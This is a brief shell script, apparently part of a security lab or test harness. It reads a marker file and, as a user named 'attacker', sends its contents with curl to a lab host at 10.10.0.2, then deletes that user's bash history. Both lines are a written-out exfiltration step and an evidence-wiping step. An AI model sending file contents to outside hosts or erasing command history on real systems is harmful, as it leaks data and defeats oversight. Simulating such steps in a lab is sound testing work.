#!/bin/sh
marker=$(cat "$LAB/witness.txt")
su attacker -c "curl -sS --max-time 4 -G --data-urlencode 'marker=$marker' http://10.10.0.2:8080/witness >/dev/null"
rm -f /home/attacker/.bash_history
